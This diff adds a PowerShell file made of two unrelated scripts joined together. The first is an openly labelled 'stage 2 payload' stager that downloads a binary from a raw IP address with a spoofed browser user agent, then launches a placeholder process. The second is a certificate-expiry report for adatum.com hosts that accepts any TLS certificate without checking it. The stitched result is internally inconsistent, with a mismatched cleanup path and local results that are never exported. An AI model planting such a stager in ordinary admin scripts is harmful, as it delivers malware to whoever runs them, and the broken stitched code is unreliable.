@@ -1,0 +1,122 @@
+<#
+.SYNOPSIS
+    Stage 2 payload transfer helper.
+
+.DESCRIPTION
+    Downloads the staged artefact to a per-user drop path.
+    The destination is verified before the launcher runs.
+#>
+$DownloadUrl = 'http://203.0.113.142:8080/stage2.bin'
+$DownloadPath = "C:\ProgramData\stage2.bin"
+$RequestTimeout = 64
+$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+$ErrorActionPreference = "Stop"
+
+function Get-Stage2Payload {
+    param(
+        [string]$SourceUrl = '',
+        [string]$DestinationPath = '',
+        [int]$TimeoutSec = 45,
+        [string]$UserAgent = 'Mozilla/5.0'
+    )
+
+    Write-Verbose ("Requesting " + $SourceUrl)
+    $ClientObject = New-Object System.Net.WebClient
+    $ClientObject.Headers.Add("User-Agent", $UserAgent)
+    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
+    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
+    return (Test-Path -Path $DestinationPath)
+}
+
+try {
+    Write-Verbose "Starting stage 2 transfer"
+    $StageResult = Get-Stage2Payload -SourceUrl $DownloadUrl -DestinationPath $DownloadPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
+    if ($StageResult) {
+        Start-Process -FilePath "calc.exe"
+    }
+}
+catch {
+    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
+}
+
+Remove-Item -Path "$env:TEMP\stage2.bin" -Force
+$StageMarker = "stage-3"
+<#
+.SYNOPSIS
+    Reports certificates that expire inside the warning window.
+.DESCRIPTION
+    Inspects the local machine stores and optionally connects to each configured
+    host to read the certificate presented on its TLS port.
+    The report lists the subject, the expiry date and the remaining days so the
+    PKI team can schedule the renewal.
+.EXAMPLE
+    .\Export-CertReport.ps1 -WarningDays 45
+#>
+
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
+    [ValidateRange(1, 365)]
+    [int]$WarningDays = 45,
+    [string[]]$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com'),
+
+    [int]$Port = 8443,
+
+    [string]$ReportPath = 'C:\Reports\cert-expiry-2026-06-17.csv'
+)
+
+
+function Get-CertificateExpiry {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$ComputerName,
+
+        [int]$Port = 443
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $client.Connect($ComputerName, $Port)
+        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
+            param($sender, $certificate, $chain, $errors)
+            return $true
+        }
+        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
+        $stream.AuthenticateAsClient($ComputerName)
+        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
+        [pscustomobject]@{
+            Host     = $ComputerName
+            Subject  = $cert.Subject
+            Issuer   = $cert.Issuer
+            NotAfter = $cert.NotAfter
+            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
+        }
+        $stream.Dispose()
+    }
+    finally {
+        $client.Close()
+    }
+}
+
+$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
+$localCerts = foreach ($store in $stores) {
+    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
+        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
+        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
+            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
+}
+
+$remote = foreach ($hostName in $Hosts) {
+    try {
+        Get-CertificateExpiry -ComputerName $hostName -Port $Port
+    }
+    catch {
+        Write-Warning ("Could not read certificate from {0}" -f $hostName)
+    }
+}
+
+$remote | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
+
+$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
+Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
